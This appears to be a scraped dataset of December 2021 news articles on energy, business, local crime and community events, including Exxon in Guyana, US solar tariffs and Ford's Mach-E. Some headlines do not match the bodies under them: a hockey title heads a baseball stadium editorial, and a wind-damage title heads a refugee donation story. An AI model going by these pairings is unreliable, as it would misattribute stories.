Ankara was accused of ""gunboat diplomacy"" in February 2018 when the Turkish navy prevented a ship leased by Italy's ENI from reaching its drilling target in Cyprus’s Block 3.

The European Commission has urged Turkey to de-escalate and vowed to defend the interests of member states Greece and Cyprus.

Turkey was widely condemned for sending its own drillships into Cypriot waters for energy exploration with the EU slapping sanctions on Ankara.

In the first half of 2022 ENI and France’s Total are expected to drill in their licensed blocks.

Cyprus has been divided since Turkey invaded and occupied its northern third in 1974 in response to a Greek-engineered coup aiming to annex the island.

Nicosia has pushed ahead with offshore energy exploration despite the collapse in 2017 of UN-brokered talks to end the country’s decades-long division.",https://news.google.com/articles/CBMib2h0dHBzOi8vd3d3LnN0YWJyb2VrbmV3cy5jb20vMjAyMS8xMi8xMS9uZXdzL2d1eWFuYS9leHhvbi10b3V0cy1ndXlhbmEtcHJvamVjdHMtYXMtdXMzMGItaW4tZm9yZWlnbi1pbnZlc3RtZW50L9IBAA?hl=en-US&gl=US&ceid=US%3Aen,Exxon touts Guyana projects as US$30B in foreign investment,"ExxonMobil Guyana President Alistair Routledge on Thursday said the company’s current cache of offshore projects and those in the pipeline represent approximately US$30 billion in direct foreign investment in the country and that it will generate billions more.

“The Liza Destiny [FPSO vessel] began production in December 2019… The Liza Unity arrived in Guyanese waters in late October and is expected to begin production early next year. Its production target is 220000 barrels per day a significant almost threefold increase from the Liza Destiny. We have a third project approved by the government last year Payara. The Prosperity [FPSO] is under construction in Singapore and is expected to sail for Guyana in 2023.

“And of course as you know we are currently in discussions with the government regarding the field development plan for the Yellowtail Project. Then there is the Gas-to-Energy project which will deliver lower cost electricity and be a cornerstone of the Wales Estate Development. These projects cumulatively represent around 30 billion US dollars of foreign direct investment in Guyana that will generate billions of US dollars revenue to the country over the coming years” Routledge told the Georgetown Chamber of Commerce and Industry’s gala dinner on Thursday night.

Routledge who also said that the company has spent approximately US$540 million with over 800 local suppliers since 2015 told those present that the projects that are currently taking place in the Stabroek Block offshore provide a foundation for the growth of the local private sector.

He said that Exxon believes that there is scope for up to 10 projects in the Stabroek Block while pointing to the five additional discoveries made for 2021 thus far. He added that many of their contractors have set up headquarters in Guyana to take advantage of the opportunities while highlighting that it has also created a space for the Guyanese private sector to also benefit.

“To date all of the major international oil and gas contractors have a presence in Guyana and have steadily been moving activities from the United States Brazil and Trinidad and Tobago to Guyana. Almost the entire supply chain for our offshore activities have been relocated to Guyana. This has created opportunities for the Guyanese private sector— whether it is build-out the shore bases warehousing or waste treatment facilities. As part of the Yellowtail project we also plan to invest in a project shore base that will enable an increase in fabrication and load-out activities in Guyana” he related.

Routledge explained that Exxon believes that Guyanese should not only benefit from the oil revenues but also play an active role in the development of the resource as well. To that end he revealed that there are more than 3200 Guyanese working on various Exxon operations.

Providing an industry perspective on the role of the private sector in the future of energy in Guyana he said that while the private sector has seized multiple opportunities they should continue to be bold in their planning.

US$500 million in revenues and cleaner energy

The Chamber’s membership heard that the government of Guyana has received nine oil lifts of one million barrels each and that coupled with royalties produced more than US$500 million in revenues.

Routledge said that by bringing the energy to shore and adding additional sources of energy Guyana has the opportunity to make economic diversification a reality. Guided by the revised Low Carbon Development Strategy he noted that the government has enlisted the private sector in the mission of delivering more energy at cheaper prices producing less emissions with the gas-to-energy project and others like the Amaila Falls Hydropower project.

He told the private sector operatives that ExxonMobil is deeply invested in a cleaner more affordable energy future for Guyana while noting that the construction of its Ogle East Coast Demerara (ECD) head office is being done with a net-zero energy footprint.

“At a corporate level ExxonMobil announced our Low Carbon Solutions business to commercialize our extensive low-carbon technology portfolio which is initially focused on Carbon Capture and Storage advancing plans for multiple new opportunities around the world to enable large-scale greenhouse gas emission reductions.

“Over time the business will include other technologies including biofuels and hydrogen as they mature to commercialization” he said

Local content

Routledge told the GCCI’s membership that while the private sector is dependent on its workforce and should invest in its employees governments also have to play their part. He added that not only will the private sector be pivotal to the development of the energy sector but the private sector can use this opportunity to build capacity capability and experience for long term international competitiveness.

“A dynamic private sector requires an enabling regulatory and fiscal environment and I can commend the government for their commitment to improving the ease of doing business by reducing bureaucracy improving access to finance and enhancing transparency” he noted.

He added that why Guyana needs to invest in its people through education and training ExxonMobil is committed to building local content and national competitiveness. Routledge said that the company remains committed to the involvement of the Guyanese workforce and suppliers of goods and services.

“Just as with other countries with large or growing energy sectors Guyana will need stable rules that facilitate large-scale investments and set priorities and outline achievable targets for the industry rather than trying to make rapid progress in every sector simultaneously” he said.

“It is important that we all collaborate to drive growth in local content. We must be cognizant of the unintended consequences that mandated targets on outcomes can have in slowing or potentially halting investment. We recognize our role in providing a sufficient flow of opportunities in order that local companies can recoup their investments. We need to work collaboratively to optimize investments remove barriers and build capacity” he however added.",https://news.google.com/articles/CBMifmh0dHBzOi8vYXV0by5lY29ub21pY3RpbWVzLmluZGlhdGltZXMuY29tL25ld3Mvb2lsLWFuZC1sdWJlcy9leHhvbi1wcm9wb3NpbmctdG8tYnVpbGQtc3VwcGx5LWRlcG90LWZvci1ndXlhbmEtcHJvamVjdC84ODIyMzMyMNIBggFodHRwczovL2F1dG8uZWNvbm9taWN0aW1lcy5pbmRpYXRpbWVzLmNvbS9hbXAvbmV3cy9vaWwtYW5kLWx1YmVzL2V4eG9uLXByb3Bvc2luZy10by1idWlsZC1zdXBwbHktZGVwb3QtZm9yLWd1eWFuYS1wcm9qZWN0Lzg4MjIzMzIw?hl=en-US&gl=US&ceid=US%3Aen,Exxon proposing to build supply depot for Guyana project,"Oil & Lubes

Exxon proposing to build supply depot for Guyana project

A coming onshore supply base will expand jobs and boost local fabrication for future projects starting with its fourth production unit Exxon's president for Guyana Alistair Routledge said in remarks late Thursday. It will bring total investment in Guyana to $30 billion he told a Georgetown Chamber of Commerce and Industry gathering.",https://news.google.com/articles/CBMiSmh0dHBzOi8vYmJqLmh1L2J1c2luZXNzL3RlY2gvdGVsY28vYS1waWxsYXItdG8tc3RhbmQtb24tZ3Jvd2luZy1hbmQtbW92aW5n0gEA?hl=en-US&gl=US&ceid=US%3Aen,A Pillar to Stand on: Growing and Moving - BBJ,"Just a few months before moving into new offices – so new in fact the building is not yet complete – the excitement at ExxonMobil Hungary is palpable. The Budapest Business Journal sat down with the project leads to discuss the details.

ExxonMobil will relocate the equivalent of a small village in moving its 2000-plus staff from the CenterPoint and myHive offices to the GTC Pillar building just off the Váci ut office corridor in District XIII in the spring of 2022.

“It will be the largest office in all of the Europe Africa and Middle East region for ExxonMobil. It is a global talent hub for all of the region and supporting the entire globe” says Jeroen Kirschbaum the lead country manager for Hungary of the Budapest-based Global Business Center.

“We’re making good progress. It’s pretty remarkable that despite the pandemic we’re still for the most part on schedule; obviously there have been a lot of challenges in the construction area in general but we’re still in pretty good shape.”

The move will be a staggered affair with a March-April time frame for moving in.

“We will have an early move stage where we make sure everything works in the building. That’s when we want all the inevitable initial problems sorted so that when we make the big move day one is perfect for everyone else” explains András Orbán the business venture manager responsible for the Budapest building project.

“We think it will be two weeks roughly to get everything sorted out then we will have the main move and we will try to get as many people as possible into that. How long that is going to be depends on many things still but let’s say two three weeks and then we will have the remaining 20% roughly who didn’t move in earlier for business reasons” Orbán says.

ExxonMobil will be the only tenant in the Pillar building. But having signed the lease in October 2019 has the concept for how the building will be used changed given the experiences learned through the pandemic?

Kirschbaum says there had been a clear strategy to build flexibility into the initial design long before COVID struck.

Evolution-proof

“We figured that things are gonna evolve over this lease. This is a long-term commitment. And things are not going to be the same five years from now 10 years from now. We have to remain flexible to respond to the evolution of workplace needs and employees. The pandemic has accelerated some of those things and we have made changes in design and how we use the spaces” he explains.

“All of the meeting spaces are ‘zoom-friendly rooms’ so that we can also effectively work in virtual or hybrid modes with all of our partners and business colleagues all over the world” Kirschbaum says of the changes made.

“There’s full Wi-Fi across the entire building; it is the first ExxonMobil building in the world that will be completely wireless and one of the first buildings in the region.”

Orbán agrees that flexibility was already a crucial element of the new design. “We are tripling the collaboration spaces and areas compared to what we have today. We will have a large area we refer to as the Pavilion for informal collaboration think tanks. We have team tables in the open plan area so there are more opportunities for people to collaborate depending on their needs” the business venture manager says.

“If it’s a formal format they can go into an enclosed area; if it’s informal they can use any of these open-plan spaces. The size didn’t decrease as a result of the pandemic but we already have a significantly improved balance pushing collaboration” Orbán adds.

ExxonMobil currently operates a hybrid model combining office and home-based locations due to the pandemic. While Kirschbaum sees the office as a “catalyst for innovation” he says working for home is likely to remain part of the structure.

“I think there will be a tremendous amount of flexibility provided to all employees based on their role based on their teams and based on their personal considerations” the country lead says. He argues it is essential not to apply a “one size fits all” approach.

“Personal situations are not the same; work deliverables are not the same. And they’re fluid over time. So there might be projects that you’re working on where for your personal growth for your productivity you should be in the office every day because that’s what’s going to make you successful” he explains.

“And there might be other days that maybe because of personal considerations or because of the work deliverables you’re most productive when you work from home. And I think applying that flexibility drives trust and accountability to the employees; to me that’s the healthy model. With flexibility comes responsibility and judgment. It’s perhaps not the easiest way to do it but I think it’s the right thing to do.”

Fishnet Carpets

As with all energy companies nowadays ExxonMobil is keen to improve its sustainability levels wherever possible. A new office building (aiming for LEED “Gold” accreditation) with greater energy efficiency solar panels rainwater harvesting bicycle racks and EV chargers helps with all that but so do the internals.

“We have acoustic ceiling panels that use 60-plus percent of recycled PET for example and we have carpets which are made 100% from fibers derived from discarded fishnet” says Orbán

In the past year about 300 positions were added to the Global Business Center. Are more on the way and are there any concerns about filling those posts in a tight labor market?

Kirschbaum admits sourcing future talent is “top of mind” although he adds “We’re not seeing that as a constraint to expanding further the overall service offering and the work scope from the Budapest hub.”

He can’t yet talk about job numbers but says the quality of the position matters at least as much as the quantity. A good example is the global talent hub for ExxonMobil’s environmental and property solutions organization.

“This is a new service offering that has never been handled out of Budapest or in a centralized way. Now most of the financial and commercial support for our property solutions and environmental activities worldwide are coordinated out of the Budapest hub. And so we appointed a new managing director who is also the first female Hungarian managing director for ExxonMobil Hungary to lead that new division. That’s also one that we expect to continue to grow and capture more opportunities.”

The appointment of a Hungarian woman as MD is timely given that the company just this month produced its first annual diversity report. It is both a statement of intent and a record to be judged on and drive accountability Kirschbaum says.

“It is important we explain what we stand for and provide a safe space for all employees in the workplace. We are proud of where we are and committed to further growth as part of our core values and focus areas.”

Blount County Sheriff's Office

A former FedEx driver faces five charges after being accused of dumping packages in a ravine.

The 22-year-old told officials he had a death in the family which caused him to make a bad choice.

""It appears that he was very sorrowful for what he had done"" Sheriff Mark Moon said Friday.

A former delivery driver faces charges after being accused of dumping hundreds of FedEx packages in an Alabama ravine last month Blount County Sheriff Mark Moon said Friday during a press conference.

Deandre Rayshaun Charleston 22 faces five cargo theft charges which is also a Class D felony. He was expected to be taken into custody after he finished his work shift for another delivery company the sheriff said.

Last month Charleston dumped at least 450 packages into a ravine in Blount County on at least six separate occasions Insider's Heather Schlitz reported.

The packages were found abandoned in a ravine on private property on November 24 and FedEx dispatched drivers to clean up the scene at 5 a.m. the following day. ""These guys came from all over the country to work on Thanksgiving. Thank you guys for your hard work and clearing up this mess"" the sheriff's office previously said.

Moon said the driver was cooperative with officers during their investigation.

""It appears that he was very sorrowful for what he had done and just admitted that he had had — was having some hard times in his life and just made poor choices"" Moon said at the news conference.

According to Moon Charleston said he had a death in the family which really burdened him and led him to make bad choices.

FedEx did not immediately respond to Insider's request for comment. But following the initial reports of the dumped packages the driver was fired from FedEx a spokesperson confirmed to Insider.

According to Moon 247 packages were unidentifiable due to missing or illegible barcodes or addresses. The value of those goods was around $24700 he said.

""I know there's a lot of people out there that want to just throw this guy away throw away the key and never give him hope of a life ever. That's not my intentions"" Moon added.

Packages have been reported dumped in other locations as well including 20 FedEx packages reported abandoned in Jemison Alabama and a dozen Amazon packages dumped in a Savannah neighborhood.

The suspect 22-year-old Deandre Rayshaun Charleston “admitted to everything” Moon announced at a news conference.

Charleston allegedly confessed to dumping scores of packages worth a total of nearly $40000 in the ditch during five different incidents from Nov. 17 to Nov. 23. According to Moon Charleston said he was distraught over a death in his family and other personal issues.

“He told our investigator he didn’t take anything he just unloaded them because he didn’t want to deliver them” Moon said.

“He was very upfront and it appeared that he was very sorrowful for what he’d done and just admitted he was having some hard times in his life and just made some poor choices” the sheriff said. “It’s one of those situations where you hate it for the young man because he did seem very respectful very polite.”

Nearly 400 packages were found in the ravine located on private property near Hayden Alabama AL.com reported. While some were able to be matched to their intended recipient about 247 boxes valued at a total of $25000 were unidentifiable according to the outlet.

Charleston was fired by FedEx a day after the discovery was made WVTM 13 reported.

He was “delivering packages for another company” on Friday Moon said but would be taken into custody afterward on five Class D felony warrants for cargo theft.

Ned Birkey an MSU Extension Educator emeritus and agricultural consultant told the county board Tuesday night that the county has scores of transmission lines that make the region attractive to DTE Consumers and other energy firms. Birkey said during his annual report on agriculture that he has visited more than a half-dozen townships to consider incorporating helpful guidelines from the state in their ordinances to control development of solar and wind energy projects.

“Every township is different in where they are at in writing” an ordinance Birkey told the nine-member board. “Many have not finished their ordinances yet and some are farther along. Michigan has a new model ordinance. I’ve offered them copies of the ordinance that was drafted by both the University of Michigan and Michigan State University together. There are a lot of side issues like health and safety to consider when it comes to solar.”

The first solar farm – Temperance Solar -- was built in 2020 on 150 acres making up the former site of the B.L. Cousino Inc. hay and straw mill in Erie Township that had existed since the mid-1930s. A 20-megawatt energy project is already operating on the parcel located at S. Dixie Hwy. (M-125) and Sterns Rd. and was constructed by Geronimo Energy.

A Virginia firm has plans to develop the second solar-powered energy farm in the county called Azalia Solar along US-23 in a rural portion of Milan Township. Apex Clean Energy of Charlottesville Va. is planning to build a 150-megawatt facility that is expected to generate enough homegrown Michigan energy to power up to 26400 homes per year the firm said. The targeted site is farmland located between the Village of Dundee and the City of Milan. The project is named after the former village at Ostrander and Dundee-Azalia Rds. in the southeast corner of Milan Township.

Birkey said in September Bedford Township wisely turned down a proposal from a private developer to build a solar farm on 800 acres. He said the state model ordinance recommends that solar farms be developed on industrial land not agricultural land. The Bedford project was proposed on farmland not an industrial site.

“To their credit Bedford denied the request” he said.

He said Frenchtown Township has many sites suitable for a solar project that don’t involve prime agricultural land. These include DTE transmission lines along I-75 the Mall of Monroe and Sterling State Park.

“There’s a lot of acreage at Sterling and the mall that is not being used currently” he said. “Instead of looking to place these projects on agricultural land they should look at other land.”

He said Frenchtown has asked him to come back to provide additional information about zoning for solar projects. He said farmland has eight different categories or classifications that can be used to plan development. He said some projects like a solar farm might require extra approvals before the project can start.

He said a representative from Ash Township told him the township is so close to Detroit Metropolitan Airport any proposal to build a solar farm in the township could be vetoed by the airport authority.

Since mid-October he also has met with officials from Exeter Ida LaSalle and London townships about their ordinances.

He plans to visit other townships in 2022.

“My only goal is to educate and present information they might want to consider for their ordinance” he stressed. “I’m not in favor of or against solar. That’s not my role. My job is to be neutral and give information.”

Commissioner Dawn Asper from Carleton said she was opposed to solar farms gobbling up good farmland in the county.

“You can’t produce that much energy just for solar” Asper said. “France is supposedly so advanced with solar but they only produce 5 percent of their energy. Solar fields are a waste and can’t be recycled.”

Commissioner David Hoffman from Dundee said a growing number of farmers around the state are selling their farmland to solar projects because of lucrative prices being paid for their property.

“Some are getting $7000 to $8000 an acre” Hoffman said. “One farmer said `that’s my retirement’.”

Another commissioner said nuclear energy is still “very efficient",https://news.google.com/articles/CBMisgFodHRwczovL3d3dy53dG9sLmNvbS9hcnRpY2xlL25ld3MvbG9jYWwvbWNraW5sZXktc3RlbW0tYWNhZGVteS11c2VzLXNvbGFyLXBhbmVsLXRvLWxpZ2h0LWNocmlzdG1hcy10cmVlLXRlYWNoLXN0dWRlbnRzLWFib3V0LXNvbGFyLWVuZXJneS81MTItYzA5NGVhNmItMTUxNi00YTc4LWE1YjItYzc5OTIzYjQ0ZThj0gEA?hl=en-US&gl=US&ceid=US%3Aen,What are STEM schools in Toledo up to?,"Recently the school received a solar panel called the Green Energy Machine after winning the Ohio STEM Learning Network Engineering Design Challenge.

TOLEDO Ohio — The countdown to Christmas is on and one local school is using its Christmas tree to learn more about how the sunlight can create energy.

The students at McKinley STEMM Academy in west Toledo are taking the things they learn every day in books and putting them into modern-day hands-on practice.

""Usually it's the students who are dictating which direction we are going and they're pursuing their own solutions. So it's really them taking control of their own learning"" said teacher Andrea Bennett.

Recently the school received a solar panel called the Green Energy Machine (G.E.M.) after winning the Ohio STEM Learning Network Engineering Design Challenge.

Bennett says seventh- and eighth-grade students competed with schools throughout the state to find and create a cost-effective solution to a real problem.

The students partnered with Yarder Manufacturing and First Solar Energy to create an energy solution to help cool Yarder’s manufacturing plant from the heat.

""It was a big accomplishment. I didn't think we were going to get as far as we did and it was definitely a big surprise"" said student McKenzy Lounsbury.

The G.E.M. solar panel which typically costs around $50000 according to school officials is now being used to make the holidays bright when students enter the building.

The G.E.M generates electricity to illuminate the LED lights that are on the tree.

""We have a sunroof type thing and the solar panel sits under that and collects the sun and now works the Christmas tree that we have in our main lobby"" said Lounsbury.

The students who were part of the project now get to see their hard work in action. They say they now feel like they understand how solar power works.

""I actually felt good about it because it helped me get it more and observe it more instead of learning out of a book"" said student Jade Latson.

McKenzy Lounsbury agreed.

""You're actually doing something hands-on in real life. So it makes you learn better because you're not just reading it you're actually doing it"" said Lounsbury.

School officials say after the Christmas break the solar panel will move throughout the school for teachers to use in lesson plans.",https://news.google.com/articles/CBMiZWh0dHBzOi8vbWFya2V0cy5idXNpbmVzc2luc2lkZXIuY29tL25ld3Mvc3RvY2tzL3doeS10YXJpZmZzLW9uLWNoaW5lc2Utc29sYXItcGFuZWxzLWZhaWxlZC0xMDMxMDQwMzcx0gEA?hl=en-US&gl=US&ceid=US%3Aen,Why Tariffs On Chinese Solar Panels Failed,"Sustained efforts by the US to boost domestic solar PV manufacturing capabilities by imposing anti-dumping tariffs on Chinese modules have comprehensively failed a Rystad Energy report reveals. Although the tariffs have indeed decimated direct shipments from China they have been unsuccessful in decreasing overall US dependency on imports which are set to hit a new annual record in 2021.

The US is on track to import a record 27.8 gigawatts (GW) of solar PV panels in 2021 from a range of countries up from 26.7 GW last year. If recent import trends continue solar PV imports for 2021 will be worth $8.9 billion in total a marginal increase from the 2020 total of $8.7 billion which was also a new record at the time.

In 2008 22% of all PV modules imported into the US were of Chinese origin. A year later Chinese PV manufacturers deployed a new business strategy with aggressively low margins which enabled them to outcompete their peers and dominate the US market. As a result by 2011 the share of Chinese PV imports had risen to 57%. Tariffs on Chinese modules introduced by the US in 2012 led to a rapid decline in the market share of Chinese manufacturers with 2021 estimates now below 1%.

However the goal of stimulating domestic manufacturing capabilities was not achieved as the US instead filled its supply vacuum with panels from other Asian countries. In 2021 US-manufactured solar PV modules are projected to total 5.2 GW compared with the 27.8 GW expected from imports. Of this 5.2 GW around half will come from thin-film panel manufacturing primarily by First Solar the world leader in thin-film production. The other half is the more widely used imported composite silicon (cSi) panels although the projected 2.5 GW represents a mere 50% of total US manufacturing capacity.

Diving deeper into the origin of US solar PV imports Malaysia became the market leader in 2020 capturing 42% of the US import market share followed by Vietnam with 38%. In 2021 to date these countries account for 31% and 28.8% respectively with Thailand in third place at 26.2%. The decrease in market share for Malaysia and Vietnam illustrates a rise in imports from other nations including Thailand and South Korea. Only 1% of 2021 year-to-date imports come from regions outside of Asia.

As the solar industry in the US has grown in recent years the government has strived to protect its domestic solar PV manufacturing capacity primarily through imposing tariffs on Chinese imports. However these punitive policies are doing little to boost domestic production. Instead they are pushing the cost of panels higher and shifting their country of origin to other Asian nations.

“The US tariffs are doing little to boost domestic production. Instead they are pushing the cost of panels higher and shifting their country of origin to other countries in Asia. Policymakers should reconsider their strategies for the US to rise in the global PV manufacturing market and supply domestic demand. A way forward could be emulating the tax credit schemes that have been instrumental in solar and wind capacity deployments in the country” says Marcelo Ortega renewables analyst with Rystad Energy.

Although these imported modules originate from Southeast Asia the manufacturers are typically Chinese enterprises that have offshored the assembly phase the last step in PV module production. Some efforts to counteract these strategies by Chinese companies have been proposed by the US but have so far fallen short.

In 2018 the Trump administration doubled down on attempts to foster a domestic supply chain for solar PV panels enacting Section 201 tariffs on imported cSi. The policy heavily impacted PV imports and capacity installations in 2018 lowering imports to 6.8 GW down 66.7% from the 10.2 GW imported in 2017. However the industry bounced back in 2019 and 2020 thanks in part to a temporary tariff exemption and the scheduled phasing down of tariffs.

In August 2021 the US Department of Commerce received an anonymous petition to investigate Chinese manufacturers circumventing anti-dumping tariffs by relocating facilities to Malaysia Thailand and Vietnam. The move could have expanded the tariffs to include these countries but the request was rejected in November. If passed the impact on US manufacturing would likely have been negligible.

In 2015 a similar investigation into Taiwan-manufactured PV modules led to a tariff extension covering Taiwan and effectively killed its panel exports to the US. However instead of US manufacturing stepping up facilities were moved to elsewhere in Asia such as Malaysia. Extending anti-dumping tariffs to other nations does not seem to incentivize US domestic manufacturing.

Despite the US’ cSi PV module manufacturing capacity of 5.5 GW per year this capacity is exclusively module assembly and relies on imported PV cells produced overseas. Asia is the PV cell market leader with 52% of US imports of solar cells so far this year coming from South Korea 25% from Malaysia and 15% from Thailand. The US is set to import a record volume of PV cells in 2021 with 3 GW expected by the end of the year eclipsing the 2.5 GW imported in 2019.

This suggests that while US domestic module assembly capabilities are ramping up current import levels indicate a meager 50.8% manufacturing capacity utilization rate without accounting for any domestic PV cell production.

The US benefits from some domestic polysilicon production but after the 2012 tariffs imposed on Chinese panels China retaliated with duties on solar-grade polysilicon imported from the US thereby propping up Chinese domestic production and setting the scene for it to become the world’s largest supplier. China now holds 97% and 79% of all silicon wafer and cell production respectively which indicates that practically no US-produced silicon makes it back into a PV cell or module.

“Without meaningful change the US solar industry is at risk of becoming assembly-only continuing its reliance on overseas commodities for the early stages of the supply chain in order to ramp up solar capacity to meet demand” Ortega concludes.

Almost all electricity used by Salt Lake City’s government will be generated by renewable means by 2023 when a massive solar farm is expected to connect to Utah’s power grid.

Several large energy users partnered to support the 80 megawatt farm — called Elektron Solar — which will generate enough electricity to power the equivalent of about 15000 homes for a year.

Developed by D.E. Shaw Renewable Investments (DESRI) the solar farm will run energy through Rocky Mountain Power to Salt Lake City as well as Park City Summit County Utah Valley University Deer Valley Resort and Park City Mountain.

“The Elektron project is historic in the coordination required to bring the clean energy facility to fruition” said Hy Martin chief development officer of DESRI. “DESRI is thrilled to develop and own a project that makes use of lands previously considered unable to be developed and celebrates the creative thinking by all involved.”

The solar farm south of Rowley in Tooele County will create electricity for at least 25 years after completion Martin said in a news conference at the groundbreaking in October.

Buying solar power will only cost Salt Lake City about 2% more than traditional energy Mayor Erin Mendenhall said and the project will cover about 80% of the electricity for municipal buildings.

Other project partners have also said Elektron’s power generation will be able to cover the vast majority of their power needs.

“It is a wonderful first step toward cleaning up our air cleaning up our water and addressing climate [change]” Park City Mayor Andy Beerman said.

The project was made possible by legislation passed in 2019 that provides a framework for municipalities to work with utilities to develop renewable energy sources.

Summit County Council Chairperson Glenn Wright said he worked with the Utah Association of Counties to lobby for this law.

“It’s a passion of mine” Wright said “and it’s incredibly important for Summit County.”

Salt Lake City had goals for reaching renewable energy before the law was signed but reaching 100% net renewable energy goals would have been an arduous task as a solo municipality Mendenhall said.

“It’s so exciting and validating that this is not a fringe conversation anymore” Mendenhall said. “You can have this conversation from an economic point without having to take a partisan stance.”

The impact of solar farm collaboration extends beyond municipalities.

UVU associate vice president Frank Young noted the solar farm helps the campus reach its carbon neutral goal.

“We want to be good stewards of the property and help the air to be cleaner in Utah County” said Young. “We want to show our students that we are serious about sustainability.”",https://news.google.com/articles/CBMihgFodHRwczovL3d3dy5qYWNrc29udmlsbGUuY29tL3N0b3J5L3Nwb3J0cy9uaGwvMjAyMS8xMi8xMS9lY2hsLWhvY2tleS1yZXBvcnQtamFja3NvbnZpbGxlLWljZW1lbi1vcmxhbmRvLXNvbGFyLWJlYXJzLWRlYy0xMS84NzgxMTIyMDAyL9IBAA?hl=en-US&gl=US&ceid=US%3Aen,ECHL hockey report: Jacksonville Icemen-Orlando Solar Bears Dec. 11,"Florida Times-Union

Last week the celebration of teamwork was all about the ballpark itself as community leaders gathered to mark their success in coming up with the funding needed for improvements to FirstEnergy Stadium.

The event was held after the state announced it was providing $7.5 million for the stadium renovation project. It is a grant from a program for the construction of regional economic and recreational improvement projects. That money — added to a total of $9 million pledged by the team Reading and Berks County — ensures that there’s enough money to cover the cost of stadium improvements required by Major League Baseball.

Things didn’t look so good as summer approached and word spread of MLB’s new standards for minor league stadiums. It would require millions of dollars to get the 70-year-old FirstEnergy Stadium up to snuff. And if the organization failed to make the necessary changes there was a chance the Reading Fightin Phils could be moved to a city with a facility that meets all the requirements.

But in a matter of months there were no more fears that Berks might lose one of its most beloved institutions.

This was hardly a foregone conclusion. Raising the necessary money required bipartisanship in an era when it is sorely lacking. And there were potentially potent political arguments to be made against funding this project. Direct government financial support for private entities especially professional sports organizations doesn’t sit well with everyone. There are potential objections to it from both ends of the political spectrum.

But in this case the Republicans who run county government and the Democrats who control City Hall immediately stepped up to the plate followed by state lawmakers of both parties.

The reason is clear. This is Baseballtown. The national pastime has been woven deeply into the fabric of this community from the early days of the 20th century. For more than 50 years the Philadelphia Phillies have operated an affiliate here and summer nights at the old ballpark are deeply cherished even by people who aren’t sports fans. FirstEnergy Stadium has a national reputation as one of America’s best places to watch a game. The idea that it could go away is unfathomable. Our political leaders ­— urban suburban and rural alike — recognized this. It’s a rare example of something that binds us in these divisive times.

There will be improvements to the existing ballpark along with construction of a two-story building beyond the right field wall. It will house the home and visiting clubhouses a female locker room batting tunnels bullpens a weight room a team dining area with a kitchen team laundry facilities space for equipment storage and other enhancements. Construction is expected to begin in September.

What makes this news even better is that the improvements to the ballpark will serve the community even when games aren’t being played. Fightin Phils General Manager Scott Hunsicker said part of the space is being designed to host large events when the team is not playing. It will offer an expansive view of the field.

We cannot overstate how important it was to get this project accomplished.

After all the difficulties Reading has endured it’s imperative that our community continues to have easy access to this fun family-oriented activity. A trip to FirstEnergy Stadium is a celebration of this community’s heritage. It’s something that needed to be preserved.

The Fightin Phils are vital to our community’s economy quality of life and identity. At a time when MLB has reduced the number of cities hosting big league affiliates having one here speaks well of our community and makes clear that this is a good place to live visit and do business. We’re grateful to have leaders who realize this.",https://news.google.com/articles/CBMibWh0dHBzOi8vd3d3LmNsZXZlbGFuZDE5LmNvbS8yMDIxLzEyLzExL2Rlc3RydWN0aXZlLXdpbmRzLXRlYXItdGhyb3VnaC1ub3J0aGVhc3Qtb2hpby1kb3duLXRyZWVzLWRhbWFnZS1ob21lcy_SAQA?hl=en-US&gl=US&ceid=US%3Aen,Destructive winds tear through Northeast Ohio down trees damage homes,"CLEVELAND Ohio (WOIO) - Destructive winds tore through Northeast Ohio on Saturday leaving a path of downed trees and power lines in their wake as residents are left to clean up the damage to their homes.

MILWAUKEE (CBS 58) -- With the snow falling and wind blowing team members and volunteers from Team Rubicon gathered outside Fiserv Forum Saturday morning collecting winter clothes for Afghan refugees that have been resettled in Wisconsin.

Team Rubicon a veteran-based disaster relief organization has taken on the challenge of helping the thousands of Afghan refugees that arrived at Fort McCoy earlier this year settle into their new homes.

With the generous support of communities and groups throughout the state members say they're ready to enter stage two of that process.

""Stage one was helping make sure everybody had the base minimums to survive basically. A lot of people came some of them really without a shirt on their back. Getting everybody that initial couple sets of clothes the items they need to move forward"" explained Mike Martel Operations Associate with Team Rubicon. ""Our next phase of this is to identify; working with resettlement agencies identify the family that's moving in the location they're moving. We're putting together furniture and houseware so that way when they're getting ready to move they just have to turn the key and walk in the door and they're ready to go.""

Jean Claassen was one of several people that showed up to donate winter clothes; anything from boots and hats to jackets and gloves.

""I just wanted to give back and help out those in need"" Claassen said encouraging others to do the same. ""Share what you can to help those in need. Especially the little kids.""

Martel says the generosity from people like Jean is what has helped make the mission so successful so far.

""It's been really refreshing to see that level of giving and caring"" Martel said. ""Having one person come through is a positive event and if you start there it's only going up.""

Saturday's event was a partnership between Team Rubicon and the Milwaukee Bucks. The first 50 people to donate were given a voucher good for two free tickets to Wednesday's game against the Indiana Pacers at Fiserv Forum.

""On a day like today we really can see how important it is to have the winter weather gear"" said Quinn Otero Corporate Social Responsibility Manager with the Bucks. ""It's the season of giving right now and I think we're just getting started with Team Rubicon.""

Martel thanked all those who have donated so far saying the refugees he's been able to meet with have been extremely grateful for the generosity coming from their new neighbors.

""They had no idea what to expect. They didn't expect this"" Martel said. ""Everyone I've talked to is just really amazed at the level of generosity and compassion that they've been shown. On their behalf thank you everybody for the support. It's hard to explain really how much of an impact it actually does have.""

F,Ford Motor Company,https://news.google.com/articles/CBMiS2h0dHBzOi8va3R2ei5jb20vbmV3cy8yMDIxLzEyLzExL2ZvcmQtdG8tcmFtcC11cC1pdHMtbXVzdGFuZy1tYWNoLWUtb3V0cHV0L9IBAA?hl=en-US&gl=US&ceid=US%3Aen,Ford to ramp up its Mustang Mach-E output,"By Ramishah Maruf CNN Business

Ford is increasing output for its Mustang Mach-Es in 2022 Ford Motor Company CEO Jim Farley announced Friday in a tweet.

The company’s first mainstream all-electric vehicle is expected to reach more than 200000 units per year for North America and Europe by 2023 Farley said tripling its current rate.

In July the Mach-E won Car and Driver’s first EV of the Year award which was open to all fully electric vehicles currently for sale in the United States. It beat 10 other electric vehicles including three Tesla models.

“The Mach-E has the driving dynamics and design to push new buyers past mere acceptance of EVs to excitement” Car and Driver’s Eric Tingwall wrote in an article about the award.

Ford said it will utilize its entire Cuautitlán plant just north of Mexico City for production. The company is working with key suppliers to increase capacity of Mustang Mach-E including battery cells battery trays and electric drive systems it added.

In September Ford and South Korea-based energy company SK Innovations announced they were investing $11.4 billion to build two new enormous manufacturing campuses for electric vehicles. Ford’s said its investment of $7 billion was the largest-ever single manufacturing investment in the company’s 118-year history.

The Mustang Mach-E which went on sale last year sold 24791 units as of November. Sales in November were up 8.4 percent compared to October.

